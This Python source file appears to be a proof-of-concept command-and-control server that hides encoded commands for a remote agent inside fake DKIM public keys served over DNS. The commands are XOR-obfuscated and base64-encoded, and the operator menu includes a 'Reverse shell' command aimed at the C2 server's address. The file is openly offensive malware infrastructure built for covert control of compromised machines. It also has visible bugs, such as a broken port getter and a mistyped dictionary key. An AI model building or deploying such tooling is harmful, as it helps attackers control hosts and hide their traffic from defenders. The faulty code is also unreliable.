#!/usr/bin/python
# -*- coding: utf8 -*-

import sys
import random
import string
import base64


class Server:
    """ Simple implementation of a C2 server acting as a DNS server that sends
    information via DKIM records.

        :param domain: Domain from the DNS server
        :param port: DNS service port, default 53
    """

    ASCII_VALUE_CHAR = {x:chr(x) for x in range(0,128)}
    # 128 characters per key
    PK_TOTAL_LENGTH = 128
    FUNCTION_REFERENCE = {
        1: {
            'name': 'Print',
            'params':[
                {'name': '*args', 'type': 'List', 'description': 'Any number of strings to print'}
            ]
        },
        2: {
            'name': 'Reverse shell',
            'params': [
                {'name': 'Remote port', 'type': 'int', 'description': 'C2 server port'},
                {'name': 'Remote server', 'type': 'str', 'description': 'IP address from C2 server'}
            ]
        },
        3: {
            'name': 'Sleep',
            'params': [
                {'name': 'Seconds', 'type':'int, float', 'description:': 'Seconds to sleep'}
            ]
        },

    }

    def __init__(self, domain: str, port: int = 53):
        self.domain = domain
        self.port = port

    @property
    def port(self, p):
        return self._port

    @port.setter
    def port(self, v):
        self._port = v

        # Assert port value
        assert 1 <= v <= 65535

    @staticmethod
    def _all_available_sums(number: int) -> tuple:
        """ Return two valid operands than when summed, the given number is obtained

        :param: Number to obtain as a sum of the other numbers
        """
        results = []
        numbers = [x for x in range(128) if x != number]
        # For each number
        for i, j in enumerate(numbers):
            # Calculate the complementary
            complementary = number - j
            # If that number is on the list, add it.
            if complementary in numbers[i + 1:]:
                results.append([j, complementary])

        # From all valid results, return a random one
        # Firstly, delete duplicates
        results = [results[i] for i in range(len(results)) if i == 0 or results[i] != results[i-1]]
        return tuple(results[random.randrange(len(results))])

    @staticmethod
    def encode(function_number: (int, str), *args: 'Any number of function arguments') -> (None, str):
        """ Applies the algorithm described in the repository to generate a decipherable DKIM public
        key by a Command and control agent.

        :param function_number: Function number to send
        :param args: Functions arguments as strings
        :return: Public key
        """

        try:
            # Convert function number to hex adn reverse it
            reversed_hex_function_number = format(int(function_number), 'x')[::-1]
        except ValueError:
            print('[!] Invalid function number data type.')
            return None

        # If hex function number has one char, add ad 0 after it. Remember that the function is reversed
        if len(reversed_hex_function_number) == 1:
            reversed_hex_function_number = '{}0'.format(reversed_hex_function_number)

        # Total length of the evaluable message is the length of the function number, plus the length of all
        # the function parameters, plus 2 characters for separator definition, plus 2 characters for evaluable length
        # definition and plus 1 for each character separator needed
        separators_need = len(args) - 1
        arguments_length = sum([len(x.encode('utf8')) for x in args])
        total_evaluable_length = len(reversed_hex_function_number) + arguments_length + \
                                 2 + 2 + separators_need

        # We need at least 1 non evaluable characters inside the PK to set as key for XOR decryption in client
        # If there are not free characters, PK cannot be created
        if Server.PK_TOTAL_LENGTH <= total_evaluable_length:
            print("[!] Two many characters to hide inside a 1024 bit Public Key")
            return None

        # Get a random character separator
        separator_ascii_repr = None
        separator = ''
        while any([separator in x for x in args]):
            separator_ascii_repr = random.randrange(len(Server.ASCII_VALUE_CHAR))
            separator = Server.ASCII_VALUE_CHAR[separator_ascii_repr]

        # Get length of evaluable message, which are only the args plus 2 * number of args - 1
        util_evaluable_length = arguments_length + separators_need

        # Get the two characters that sum the divider ASCII representation
        try:
            char1, char2 = Server._all_available_sums(separator_ascii_repr)
        except ValueError:
            print('[!] Could not find complementary ASCII numbers, please re-execute')
            return None

        print('[*] Selected divider: {}({} ASCII). {} + {} = {}'.format(separator, separator_ascii_repr,
                                                                        char1, char2, repr(separator_ascii_repr)))

        # Now we have the function number, the ASCII number to create the separator, the separator,
        # the util evaluable length, we can mix every thing
        non_xored_pk = ''

        # Add the function number HEX representation
        non_xored_pk += reversed_hex_function_number

        # Add the two characters to get the separator
        non_xored_pk += Server.ASCII_VALUE_CHAR[char1] + Server.ASCII_VALUE_CHAR[char2]

        # How many random characters do we have to create the XOR key?
        xor_key_length = Server.PK_TOTAL_LENGTH - 6 - util_evaluable_length

        # Get two characters which are the length of the evaluable message
        try:
            sum1, sum2 = Server._all_available_sums(util_evaluable_length)
        except ValueError:
            print('[!] Could not find complementary ASCII numbers, please re-execute')
            return None

        # Add them
        non_xored_pk += Server.ASCII_VALUE_CHAR[sum1] + Server.ASCII_VALUE_CHAR[sum2]

        # Create another variable to store the rest
        to_xor_pk = separator.join(args)

        # Generate the key with random characters with the calculated length
        key = ''.join(random.choice(string.printable) for _ in range(xor_key_length))

        # If length of the key is greater than the message just get len(message) chars from the key
        if xor_key_length > util_evaluable_length:
            aux = key[0:util_evaluable_length]
        # if util evaluable length is greater, add the key to itself until it has the same length
        elif util_evaluable_length > xor_key_length:
            number_of_additions = util_evaluable_length // xor_key_length
            partial_addition = util_evaluable_length % xor_key_length
            aux = number_of_additions * key + key[0:partial_addition]
        # In ano other case, do not modify the key (if equal lengths
        else:
            aux = key

        print('[+] Info util: {} (length = {}) \n [+] Key util: {} (length = {})'.format(repr(to_xor_pk),
                                                                                         util_evaluable_length,
                                                                                         repr(key), len(key)))

        # for each character, XOR
        xored_pk = ''.join([chr(ord(a) ^ ord(b)) for (a,b) in zip(to_xor_pk, aux)])
        print('[+] Encrypted data: {}'.format(repr(xored_pk)))

        # Validate data length
        if (7 + len(key) + len(to_xor_pk)) == 128:
            print('[+] Valid calculations')

        # Concat everything
        final_pk = non_xored_pk + xored_pk + key

        # Base64 encode
        final_pk_e = base64.b64encode(bytes(final_pk, 'utf8')).decode('utf8')

        print('[+] Final PK non(B64): {}({} characters with {} bits)'.format(repr(final_pk), len(final_pk), len(final_pk) * 8))
        print('[+] Final PK: {}({} characters with {} bits)'.format(repr(final_pk_e), len(final_pk_e), len(final_pk_e) * 8))

        xored_pk = ''.join([chr(ord(a) ^ ord(b)) for (a, b) in zip(xored_pk, aux)])
        print('[+] Back to original: {}'.format(repr(xored_pk)))

        return final_pk_e

    def _serve_routine(self):
        """ Routine to re-execute any number of times
        """
        option = -1
        while not option in Server.FUNCTION_REFERENCE:
            print('Choose a function to execute on client')
            for i, j in Server.FUNCTION_REFERENCE.items():
                print('\t{}) {}'.format(i, j['name']))
            try:
                option = int(input('Option: '))
            except ValueError:
                option = -1

        params = []
        if Server.FUNCTION_REFERENCE[option]['params']:
            print('[*] Parameters for "{}" function'.format(Server.FUNCTION_REFERENCE[option]['name']))
            for i in Server.FUNCTION_REFERENCE[option]['params']:
                print('\t[*] Param name: {}'.format(i['name']))
                print('\t[*] Param type: {}'.format(i['type']))
                print('\t[*] Param description: {}'.format(i['description']))
                params.extend(input('Value: ').split())

        print()
        self.encode(str(option), *params)
        print()

    def serve_forever(self):
        while True:
            try:
                self._serve_routine()
            except KeyboardInterrupt:
                print('[!] Halted')
                sys.exit(-1)


if __name__ == '__main__':
    s = Server('example.com')
    # s.encode(1, 'Hello World!', 'I am printing two strings!')
    s.serve_forever()
